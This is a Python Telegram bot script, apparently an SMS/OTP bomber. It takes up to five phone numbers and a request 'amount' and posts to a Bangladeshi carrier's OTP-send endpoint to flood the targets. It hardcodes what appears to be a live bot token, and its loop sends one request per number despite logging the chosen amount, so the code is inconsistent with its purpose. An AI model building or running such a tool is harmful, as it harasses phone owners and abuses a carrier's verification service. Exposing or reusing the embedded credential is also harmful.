#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import requests
from requests.structures import CaseInsensitiveDict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from flask import Flask
from threading import Thread

# ---------------- CONFIG ----------------
BOT_TOKEN = "7719776924:AAGxCXF0as6sGihPkWrlMqmM6A7T2TKEduo"
AUTHORIZED_USER_ID = 6048050987
API_URL = "https://da-api.robi.com.bd/da-nll/otp/send"
HEADERS = CaseInsensitiveDict()
HEADERS["Content-Type"] = "application/json"
MAX_AMOUNT = 500
# ----------------------------------------

# In-memory history
history = []

# ---------------- Flask App ----------------
app_flask = Flask(__name__)

@app_flask.route('/')
def home():
    return "✅ RK-SYSTEM Bot is Running Successfully!"

# ---------------- Telegram Bot Handlers ----------------
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return
    keyboard = [
        [InlineKeyboardButton("Send OTP", callback_data="send_otp")],
        [InlineKeyboardButton("History", callback_data="history")]
    ]
    await update.message.reply_text(
        "Welcome! Choose an option:",
        reply_markup=InlineKeyboardMarkup(keyboard)
    )

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    if query.from_user.id != AUTHORIZED_USER_ID:
        return

    if query.data == "send_otp":
        await query.message.reply_text(
            "Send OTP to 1–5 numbers (comma separated, e.g., 01812345678,01887654321):"
        )
        context.user_data['state'] = 'await_numbers'

    elif query.data == "history":
        if not history:
            await query.message.reply_text("No history found.")
        else:
            msg = "\n".join([f"{h['number']} | Amount: {h['amount']}" for h in history])
            await query.message.reply_text(f"History:\n{msg}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != AUTHORIZED_USER_ID:
        return

    state = context.user_data.get('state', '')

    if state == 'await_numbers':
        numbers = [n.strip() for n in update.message.text.split(",")]
        if len(numbers) > 5:
            await update.message.reply_text("Max 5 numbers allowed at a time.")
            return
        for n in numbers:
            if not n.isdigit() or len(n) != 11:
                await update.message.reply_text(f"Invalid number: {n}")
                return
        context.user_data['numbers'] = numbers
        context.user_data['state'] = 'await_amount'
        await update.message.reply_text(f"Enter amount (max {MAX_AMOUNT}):")

    elif state == 'await_amount':
        try:
            amount = int(update.message.text.strip())
            if amount > MAX_AMOUNT or amount <= 0:
                await update.message.reply_text(f"Amount must be 1–{MAX_AMOUNT}.")
                return
            context.user_data['amount'] = amount
        except ValueError:
            await update.message.reply_text("Enter a valid number for amount.")
            return

        await update.message.reply_text(f"Sending {context.user_data['amount']} requests to {len(context.user_data['numbers'])} numbers...")
        for number in context.user_data['numbers']:
            data = '{"msisdn":"%s"}' % number
            try:
                requests.post(API_URL, headers=HEADERS, data=data)
                history.append({'number': number, 'amount': context.user_data['amount']})
            except Exception as e:
                await update.message.reply_text(f"Failed for {number}: {e}")

        await update.message.reply_text("Done sending requests!")
        context.user_data.clear()

# ---------------- Run Bot + Flask ----------------
def run_bot():
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CallbackQueryHandler(button))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    print("Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    # Start Telegram bot in a separate thread
    Thread(target=run_bot).start()

    # Start Flask server (Render requires PORT)
    port = int(os.environ.get("PORT", 5000))
    app_flask.run(host="0.0.0.0", port=port)
